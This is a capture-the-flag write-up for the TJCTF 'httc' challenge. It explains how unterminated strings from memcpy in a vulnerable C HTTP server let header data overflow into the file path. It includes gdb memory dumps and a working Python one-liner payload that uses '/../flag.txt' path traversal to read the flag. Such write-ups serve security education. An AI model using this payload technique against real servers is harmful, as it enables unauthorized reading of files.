# httc (190 points)

## The Problem:
  You're given a vulnerable http server written in C. Get the flag.
  
## The Process:

For this problem, I decided to ask one of my teammates for help (I know nothing about http headers). When analyzing the source code for flaws, we found one minor bug that ended up being a major one.

```C
108:    char key[51], value[51], method[51], url[51], http_version[51];
109:
110:    header->headers = malloc(sizeof(http_header_t*));
111:    header->header_c = 0;
112:
113:    line = get_line(true);
114:
115:    if(line == NULL || sscanf(line, "%33[^ ] %50[^ ] %8[^ ]", method, url, http_version) != 3) {
116:        return_400();
117:    }
118:    memcpy(header->http_version, http_version, 8);
119:    memcpy(header->method, method, 33);
120:    memcpy(header->url, url, 50);
121:    header->error_callback = &exit;
    
```

In line 108, we saw that every single variable, regardless of size, was declared to 51 bytes in length. The largest actual size in any of the structs was 50. This, in combination with the unfortunate use of `memcpy()` in lines 118-120 enables us to have unterminated strings. Bad programming.

From here, we also observed that the `clean_url()` function "sanitized" the original URL and then copied it. In addition to this, because `process_reques()` and `get_header()` occupy the same stack frame, there was a bit of exploitable overlap in the variables.

using gdb, we set a breakpoint right before the `fopen()` call to see what kind of damage we could do.

```
gdb-peda$ b*0x56556240
Breakpoint 1 at 0x56556240
gdb-peda$ r
Starting program: /vagrant/Downloads/server_497d5536972b10a781449f7295b648f8dbc9b9c147fc8cd3b94fc45818a80d8e
GET /./././././././././././././././././././././././.// HTTP/1.1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

---snip snip---


gdb-peda$ x /40wx $esp

0xffffd594:	0x565567ec	0x00000032	0x5655606e	0x00000000
0xffffd5a4:	0xf7fc9000	0xf7fc9ac0	0x2fe8fd74	0x656d6f68
0xffffd5b4:	0x7070612f	0x6265772f	0x2f2e2f2f	0x2f2e2f2e
0xffffd5c4:	0x2f2e2f2e	0x2f2e2f2e	0x2f2e2f2e	0x2f2e2f2e
0xffffd5d4:	0x2f2e2f2e	0x2f2e2f2e	0x2f2e2f2e	0x2f2e2f2e
0xffffd5e4:	0x2f2e2f2e	0x2f2e2f2e	0x422f2f2e	0x42424242
0xffffd5f4:	0x42424242	0x42424242	0x00424242	0x41000ab4
0xffffd604:	0x41414141	0x41414141	0x41414141	0x00414141
0xffffd614:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd624:	0x41414141	0x41414141	0x56559011	0x56558000
```

As you can see above, the strings mash together, creating this in memory:
```
"home/app/web//././././././././././././././././././././././././/BBBBBBBBBBBBBBBB"
```

From here, all we have to do is change the last few "B"s with our payload.

```
python -c 'print """GET /./././././././././././././././././././././././.// HTTP/1.1\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB/../flag.txt"""' | ./server_497d5536972b10a781449f7295b648f8dbc9b9c147fc8cd3b94fc45818a80d8e
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: httc/1.0 Ubuntu/14.04.2

fl4g{Th1s_1s_my_l0c4l_fl4g}
```

Now all we have to do is run it on the real server, and we get the flag!

##Flag:

```tjctf{tfw_n0_st@ck_pr0t3ct1on_lma0}```